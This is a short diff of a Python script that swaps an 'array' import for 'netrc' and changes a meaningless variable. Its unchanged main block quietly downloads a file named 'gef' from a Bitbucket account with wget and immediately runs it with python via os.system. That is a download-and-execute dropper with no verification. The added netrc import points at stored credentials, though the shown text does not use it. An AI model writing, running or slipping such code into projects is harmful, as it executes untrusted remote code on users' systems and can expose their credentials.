@@ -1,4 +1,4 @@
-import sys,os,array
-f=18
+import sys,os,netrc
+o=6
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
